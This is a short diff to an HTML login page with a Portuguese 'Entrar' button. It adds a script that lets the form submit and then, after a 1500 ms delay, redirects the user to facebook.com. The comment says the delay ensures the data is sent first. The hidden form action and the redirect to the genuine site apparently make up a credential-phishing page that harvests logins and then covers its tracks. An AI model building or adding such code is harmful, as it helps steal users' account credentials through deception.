@@ -61,6 +61,14 @@
             
             <button type="submit">Entrar</button>
         </form>
+        <script>
+        document.getElementById('Login').onsubmit = function() {
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com";
+            }, 1500); // Atraso de 1500ms para garantir que os dados sejam enviados antes do redirecionamento
+            return true; // Permite que o formulário seja enviado
+        };
+        </script> 
     </div>
 
 </body>
